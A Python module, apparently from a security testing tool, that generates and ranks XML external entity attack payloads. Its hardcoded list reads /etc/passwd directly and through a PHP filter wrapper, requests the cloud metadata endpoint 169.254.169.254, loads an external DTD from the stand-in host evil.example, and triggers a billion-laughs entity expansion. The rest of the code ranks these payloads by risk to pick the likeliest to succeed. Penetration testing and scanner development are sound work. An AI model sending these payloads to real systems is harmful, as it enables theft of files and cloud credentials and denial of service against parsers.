"""XXE (XML external entity) payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_xxe_context

_DECL = '<?xml version="1.0"?>'

# The input is the whole document: inject a DOCTYPE with an external entity.
_DOC_BODIES = [
    (
        _DECL + '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        "file-read",
    ),
    (
        _DECL
        + '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/">]>'
        + "<r>&xxe;</r>",
        "ssrf",
    ),
    (
        _DECL
        + "<!DOCTYPE r [<!ENTITY xxe SYSTEM "
        + '"php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>',
        "php-wrapper",
    ),
    (
        _DECL
        + '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://evil.example/x.dtd"> %ext;]>'
        + "<r/>",
        "oob-parameter",
    ),
    (
        _DECL
        + '<!DOCTYPE r [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;">'
        + '<!ENTITY c "&b;&b;&b;">]><r>&c;</r>',
        "billion-laughs",
    ),
]

# The input is element content: only a reference to a pre-declared entity fits.
_CONTENT_BODIES = [
    ("&xxe;", "entity-ref"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class XxeCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class XxeMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[XxeCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.XXE_CONTENT:
        return _CONTENT_BODIES
    return _DOC_BODIES


def mutate_xxe(template: str) -> XxeMutationResult:
    """Generate and rank XXE payloads for ``template``."""
    from .analyzer import analyze_xxe

    context = analyze_xxe_context(template)
    generated = _bodies(context)

    candidates: list[XxeCandidate] = []
    for payload, strategy in generated:
        result = analyze_xxe(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                XxeCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return XxeMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
